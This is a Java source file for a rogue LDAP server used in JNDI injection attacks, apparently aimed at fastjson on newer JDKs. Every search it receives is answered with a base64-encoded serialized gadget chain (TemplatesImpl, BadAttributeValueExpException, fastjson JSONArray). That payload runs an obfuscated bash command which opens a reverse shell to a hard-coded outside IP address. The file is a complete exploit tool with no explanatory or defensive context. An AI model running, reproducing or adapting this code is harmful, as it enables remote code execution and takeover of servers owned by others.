package com.fc0.ldap_high;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;
//高版本LDAP绕过

public class Main {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{"http://localhost/#Evail"};
        int port = 6666;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port);
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABr8r+ur4AAAAxABgBAAFhBwABAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAAwEABjxpbml0PgEAAygpVgEABENvZGUMAAUABgoABAAIAQARamF2YS9sYW5nL1J1bnRpbWUHAAoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAMAA0KAAsADgEAXWJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1qRXVOREV1TXpRdU1qVXZOemMzTnlBd1BpWXh9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQAKU291cmNlRmlsZQEABmEuamF2YQAhAAIABAAAAAAAAQABAAUABgABAAcAAAAaAAIAAQAAAA4qtwAJuAAPEhG2ABVXsQAAAAAAAQAWAAAAAgAXcHQAAzExMXB3AQB4c3IALmphdmF4Lm1hbmFnZW1lbnQuQmFkQXR0cmlidXRlVmFsdWVFeHBFeGNlcHRpb27U59qrYy1GQAIAAUwAA3ZhbHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdlcQB+AAVbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7TAAUc3VwcHJlc3NlZEV4Y2VwdGlvbnN0ABBMamF2YS91dGlsL0xpc3Q7eHBxAH4AFHB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAAFzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4ABUwACGZpbGVOYW1lcQB+AAVMAAptZXRob2ROYW1lcQB+AAV4cAAAAC50ABxjb20uZmMwLmxkYXBfaGlnaC5GYXN0anNvbjgzdAAPRmFzdGpzb244My5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgATeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ACF4c3IAHmNvbS5hbGliYWJhLmZhc3Rqc29uLkpTT05BcnJheQAAAAAAAAABAgABTAAEbGlzdHEAfgATeHBzcQB+ACAAAAABdwQAAAABcQB+AAd4eA=="));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
